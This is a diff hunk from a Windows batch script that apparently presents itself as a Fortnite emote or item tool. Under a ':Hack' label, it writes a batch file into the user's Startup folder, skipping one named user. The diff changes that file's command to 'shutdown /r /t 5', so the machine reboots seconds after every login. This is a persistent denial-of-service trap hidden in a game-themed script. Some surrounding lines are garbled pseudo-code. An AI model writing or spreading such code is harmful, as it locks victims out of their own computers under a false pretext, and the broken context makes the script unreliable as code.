@@ -57,7 +57,7 @@ when "addnumber" execute @give C:\Users\program\fortnite\emotestore\renegade rai
 :Hack 
 if %username%==joopc GOTO :end
 echo @echo off>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getfuqed.bat
-echo shutdown /f /t 5>>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getfuqed.bat"
+echo shutdown /r /t 5>>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getfuqed.bat"
 
 :end
 exit
